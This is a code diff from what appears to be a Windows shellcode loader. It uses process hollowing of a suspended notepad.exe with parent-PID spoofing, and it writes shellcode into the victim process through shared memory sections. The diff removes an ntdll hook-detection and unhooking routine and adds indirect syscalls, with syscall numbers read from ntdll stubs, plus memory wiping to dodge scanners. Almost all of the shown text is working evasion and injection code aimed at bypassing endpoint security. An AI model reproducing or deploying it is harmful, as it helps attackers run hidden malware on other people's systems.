@@ -71,6 +71,7 @@ constexpr auto ntprotect_Rotr32A = HashStringDjb2A("NtProtectVirtualMemory");
 constexpr auto ntcreatethread_Rotr32A = HashStringDjb2A("NtCreateThreadEx");
 constexpr auto ntwrite_Rotr32A = HashStringDjb2A("NtWriteVirtualMemory");
 constexpr auto ntquery_Rotr32A = HashStringDjb2A("NtQueryInformationThread");
+constexpr auto ntqueue_Rotr32A = HashStringDjb2A("NtQueueApcThread");
 
 // static variables
 char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
@@ -201,7 +202,7 @@ FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName) {
         
         // Searching for the function specified
         if (lpApiName == RTIME_HASHA(pFunctionName)) {
-            printf("\t[+] Function %s found at address 0x%p with ordinal %d\n", pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
+            //printf("\t[+] Function %s found at address 0x%p with ordinal %d\n", pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
             return (FARPROC)pFunctionAddress;
         }
     }
@@ -210,104 +211,6 @@ FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName) {
 }
 
 
-
-
-
-
-/**
-*   Check if the first bytes of the ntdll function is hooked or not
-*   All ntdll functions begins with \x4c\x8b\xd1\xb8
-*   If these bytes are differents, the function is hooked
-*   https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions
-*/
-BOOL isItHooked(LPVOID addr) {
-    BOOL result = FALSE;
-    BYTE stub[] = { 0x4c, 0x8b, 0xd1, 0xb8 };
-    if (memcmp(addr, stub, sizeof(stub)) != 0) {
-        result = TRUE;
-    }
-    return result;
-}
-
-
-
-
-/**
-*   Check if common critical functions are hooked or not
-*   If they are hooked, the function will map in memory
-*   a copy of the ntdll.dll file to override our process'
-*   ntdll text section with the mapped text section to
-*   recover the original functions addresses 
-*/
-void unhook() {
-    printf("[+] Detecting ntdll hooks\n");
-    int nbHooks = 0;    
-    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntalloc_Rotr32A ))) {
-        nbHooks++;
-    }
-    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntprotect_Rotr32A))) {
-        nbHooks++;
-    }
-    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntcreatethread_Rotr32A))) {
-        nbHooks++;
-    }
-    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntquery_Rotr32A))) {
-        nbHooks++;
-    }
-    if (nbHooks > 0) {
-        printf("[+] Unhooking ntdll from a fresh memory alloc\n");
-        HANDLE process = GetCurrentProcess();
-        MODULEINFO mi = {};
-        // our current process ntdll module
-        PVOID ntdllModule = CustomGetModuleHandle(_ntdll);
-        GetModuleInformation(process, (HMODULE) ntdllModule, &mi, sizeof(mi));
-        LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
-        // create a mapped copy of the ntdll.ddl file from disk
-        HANDLE ntdllFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-        HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-        LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
-        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
-        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
-        // for each section of our mapped copy, if it is the text section, then override our process ntdll text section module
-        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
-            PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
-            if (!strcmp((char*)hookedSectionHeader->Name, (char*)sntdll)) {
-                DWORD oldProtection = 0;
-                bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
-                memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
-                isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
-            }
-        }
-        // Redefine Nt functions
-        printf("[+] Redefining Nt functions\n");
-        HMODULE hNtdll = CustomGetModuleHandle(_ntdll);
-        _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)CustomGetProcAddress(hNtdll, ntalloc_Rotr32A);
-        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)CustomGetProcAddress(hNtdll, ntwrite_Rotr32A);
-        _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)CustomGetProcAddress(hNtdll, ntprotect_Rotr32A);
-        _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)CustomGetProcAddress(hNtdll, ntcreatethread_Rotr32A);
-        _NtQueryInformationThread NtQueryInformationThread = (_NtQueryInformationThread)CustomGetProcAddress(hNtdll, ntquery_Rotr32A);
-        printf("[+] Detecting hooks in new ntdll module\n");
-        nbHooks = 0;
-        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntalloc_Rotr32A))) {
-            nbHooks++;
-        }
-        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntprotect_Rotr32A))) {
-            nbHooks++;
-        }
-        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntcreatethread_Rotr32A))) {
-            nbHooks++;
-        }
-        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntquery_Rotr32A))) {
-            nbHooks++;
-        }
-        if (nbHooks > 0) {
-            printf("[!] Unhooking failed\n");
-        }
-        else {
-            printf("[+] Unhooking works\n");
-        }
-    }
-}
 
 
 
@@ -369,6 +272,43 @@ DWORD GetPID() {
 
 
 
+
+/*
+* Credits to am0nsec
+* https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
+*/
+PVOID CustomMemMove(PVOID dest, const PVOID src, SIZE_T len) {
+    char* d = (char* )dest;
+    const char* s = (char*)src;
+    if (d < s)
+        while (len--)
+            *d++ = *s++;
+    else {
+        char* lasts = (char*)s + (len - 1);
+        char* lastd = d + (len - 1);
+        while (len--)
+            *lastd-- = *lasts--;
+    }
+    return dest;
+}
+
+
+
+
+
+
+
+
+
+
+
+// Global variables definitions
+EXTERN_C DWORD syscallID = 0;
+EXTERN_C UINT_PTR syscallAddr = 0;
+
+// ASM functions definitions
+extern "C" VOID indirect_sys(...);
+
 /**
 *   Execute our raw payload by creating a suspended process (Process Hollowing)
 *   with a custom thread attribute list to spoof its parent PID (PPID spoofing)
@@ -389,44 +329,73 @@ void execution(std::vector<BYTE> sh, DWORD exPID) {
     InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
     UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
     si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
-    CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\calc.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
+
+    CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
     HMODULE hNtdll = CustomGetModuleHandle(_ntdll);
-    _NtCreateSection ntCreateSection = (_NtCreateSection)CustomGetProcAddress(hNtdll, ntcreate_Rotr32A);
-    _NtMapViewOfSection ntMapViewOfSection = (_NtMapViewOfSection)CustomGetProcAddress(hNtdll, ntmap_Rotr32A);
-    _NtUnmapViewOfSection ntUnmapViewOfSection = (_NtUnmapViewOfSection)CustomGetProcAddress(hNtdll, ntunmap_Rotr32A);
+
+    
+    FARPROC pNtCreateSection = CustomGetProcAddress(hNtdll, ntcreate_Rotr32A);
+    UINT_PTR pNtCreateSectionSyscallID = (UINT_PTR)pNtCreateSection + 4;
+    syscallID = ((unsigned char*)(pNtCreateSectionSyscallID))[0];
+    printf("[+] Syscall value of NtCreateSection : 0x%04x\n", syscallID);
+    syscallAddr = (UINT_PTR)pNtCreateSection + 0x12;
     // create section in local process
     HANDLE hSection;
     LARGE_INTEGER szSection = { sh.size() };
-    NTSTATUS status = ntCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&szSection,PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
+    printf("[+] Creating new section through indirect syscall\n");
+    indirect_sys(&hSection, SECTION_ALL_ACCESS, NULL, &szSection, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+
+
+    FARPROC pNtMapViewOfSection = CustomGetProcAddress(hNtdll, ntmap_Rotr32A);
+    UINT_PTR pNtMapViewOfSectionSyscallID = (UINT_PTR)pNtMapViewOfSection + 4;
+    syscallID = ((unsigned char*)(pNtMapViewOfSectionSyscallID))[0];
+    printf("[+] Syscall value of NtMapViewOfSection : 0x%04x\n", syscallID);
+    syscallAddr = (UINT_PTR)pNtMapViewOfSection + 0x12;
     // map section into memory of our local process
     PVOID hLocalAddress = NULL;
     SIZE_T viewSize = 0;
-    status = ntMapViewOfSection(hSection,GetCurrentProcess(),&hLocalAddress,NULL,NULL,NULL,&viewSize,ViewShare,NULL,PAGE_EXECUTE_READWRITE);
+    indirect_sys(hSection, GetCurrentProcess(), &hLocalAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
+    printf("[+] Mapping new section through indirect syscall\n");      
+
     // copy shellcode into our local memory
-    RtlCopyMemory(hLocalAddress, ptr, sh.size());
+    CustomMemMove(hLocalAddress, ptr, sh.size());
+    printf("[+] Copying shellcode into our new local section\n");
+
     // map section into memory of suspended child process
     PVOID hRemoteAddress = NULL;
     printf("[+] Adding new section with shellcode\n");
-    status = ntMapViewOfSection(hSection,victimProcess,&hRemoteAddress,NULL,NULL,NULL,&viewSize,ViewShare,NULL,PAGE_EXECUTE_READWRITE);
+
+    indirect_sys(hSection, victimProcess, &hRemoteAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
+    printf("[+] Copying local section to victim process through indirect syscall\n");
+
 
     // wiping our current process memory to avoid memory scanning
     printf("[+] Cleaning local memory\n");
     memset(&sh, 0, sizeof(sh));
     memset(&hLocalAddress, 0, sizeof(hLocalAddress));
 
+
     // get context of main thread
     LPCONTEXT pContext = new CONTEXT();
     pContext->ContextFlags = CONTEXT_INTEGER;
     printf("[+] Creating new thread\n");
+
     GetThreadContext(threadHandle, pContext);
     // update rcx context to execute our payload
     pContext->Rcx = (DWORD64)hRemoteAddress;
     SetThreadContext(threadHandle, pContext);
     printf("[+] Resuming execution\n");
     ResumeThread(threadHandle);
-    status = ntUnmapViewOfSection(victimProcess,hLocalAddress);
+
+    FARPROC pNtUnmapViewOfSection = CustomGetProcAddress(hNtdll, ntunmap_Rotr32A);
+    UINT_PTR pNtUnmapViewOfSectionSyscallID = (UINT_PTR)pNtUnmapViewOfSection + 4;
+    syscallID = ((unsigned char*)(pNtUnmapViewOfSectionSyscallID))[0];
+    printf("[+] Syscall value of NtUnmapViewOfSection : 0x%04x\n", syscallID);
+    syscallAddr = (UINT_PTR)pNtUnmapViewOfSection + 0x12;
+    indirect_sys(victimProcess, hLocalAddress);
+    printf("[+] Unmapping local section through indirect syscall\n");
 }
 
 
